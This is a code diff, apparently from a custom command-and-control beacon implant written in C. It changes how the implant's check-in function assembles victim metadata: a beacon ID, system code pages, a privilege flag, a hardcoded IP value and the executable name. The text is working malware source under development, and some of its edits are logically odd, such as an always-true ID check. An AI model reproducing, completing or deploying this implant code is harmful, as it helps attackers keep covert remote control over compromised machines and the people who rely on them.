@@ -137,7 +137,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			{
 				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Str ) )
 				{
-					if ((Ins.BeaconId = RandomNumber32( &Ins )) != 0)
+					if ((Ins.BeaconId = RandomNumber32( &Ins )) <= ULONG_MAX)
 					{
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
@@ -158,15 +158,15 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									{
 										if ((Hdr = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ))))
 										{
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Str, 16 ))) 
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Str, 16 )))
 												break; 
 											else Hdr = Buf;
 											
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, HTONS(Ins.api.GetACP()) ))) 
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP()) )) 
 												break; 
 											else Hdr = Buf;
 											
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, HTONS(Ins.api.GetOEMCP()) ))) 
+											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP()) )) 
 												break;
 											else Hdr = Buf;
 
@@ -183,10 +183,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 											else Hdr = Buf;
 
 											//
-											// BUG BUG 
-											//
-											// Check if we're SYSTEM or ADMIN,
-											// and OR' the flags here.
+											// REMOVE HARDCODED VALUE
 											//
 
 											if (!(Buf = BufferAddUI1( &Ins, Hdr, 2 )))
@@ -218,13 +215,10 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 											else Hdr = Buf;
 
 											//
-											// BUG BUG BUG
-											//
-											// Add code to calculate the IPv4 address
-											// of the current interface being sent out
+											// REMOVE HARDCODED VALUE
 											//
 
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
+											if (!(Buf = BufferAddUI4( &Ins, Hdr, HTONL(0x100007f) )))
 												break;
 											else Hdr = Buf;
 
@@ -244,19 +238,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 												break;
 											else Hdr = Buf;
 
-											//
-											// BUG BUG
-											//
-											// So, the EXE isnt being converted to ASCII
-											// properly, so we'll have to fix that first
-											// to finish the check-in properly.
-											//
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, 'a' )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, '\0' )))
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Exe, strlen(Exe) )))
 												break;
 											else Hdr = Buf;
 
